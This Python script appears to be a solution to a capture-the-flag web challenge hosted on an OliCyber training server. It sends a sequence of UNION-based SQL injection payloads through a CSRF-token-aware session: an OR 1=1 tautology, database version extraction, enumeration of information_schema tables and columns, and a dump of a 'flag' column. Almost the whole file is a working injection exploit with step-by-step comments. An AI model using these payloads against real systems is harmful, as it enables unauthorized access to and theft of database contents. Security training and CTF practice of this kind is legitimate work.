import requests
import binascii
import time


class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    
    
    
inj = Inj('http://web-17.challs.olicyber.it')
#to retrive information about SELECT * FROM dummy_data WHERE id='1'
response, error = inj.union("1")
print("this is about one id\n"+response)
#to retrieve information about all row
response, error = inj.union("1' OR 1=1 -- this is a comment")
print("\nthis is about all ids\n"+response)
#to retrieve information about version of db
#note that the second query SELECT 1,2,3,4,5,version() must have the same number of columns in this case 6
response, error = inj.union("1' union SELECT 1,2,3,4,5,version(); -- this is a comment")
print("\nthis is about the version of database\n"+response)
#to retrieve information of db about the all tables contained
response, error = inj.union("1' union SELECT table_name, 2, 3, 4, 5, 6 FROM information_schema.tables -- this is a comment")
print("\nthis is about the tables of database\n"+response)
#to filter data to see only data about current schema
response, error = inj.union("1' union SELECT table_name, 2, 3, 4, 5, 6 FROM information_schema.tables WHERE table_schema = DATABASE() -- this is a comment")
print("\nthis is about the tables of interest in database\n"+response)
#to retrieve all columns about a table in this case about "real_data"
response, error = inj.union("1' union SELECT column_name, 2, 3, 4, 5, 6 FROM information_schema.columns WHERE table_name = 'real_data' -- this is a comment")
print("\nthis is about the columns of a specific table\n"+response)
#to retrieve all columns of all tables in current schema
response, error = inj.union("1' union SELECT table_name, column_name, 2, 3, 4, 5 FROM information_schema.columns WHERE table_schema = DATABASE() -- this is a comment")
print("\nthis is about the tables of interest in database\n"+response)
#to retrieve the flag
response, error = inj.union("1' union SELECT id, flag, 2, 3, 4, 5 FROM real_data WHERE id = '1' OR 1=1 -- this is a comment")
print("\nflag\n"+response)
#i cannot use the comment to terminate the injection using instead AND
response, error = inj.union("1' union SELECT id, flag, 2, 3, 4, 5 FROM real_data WHERE id = '1' OR 1=1 AND '1'='1")
print("\nflag with AND\n"+response)
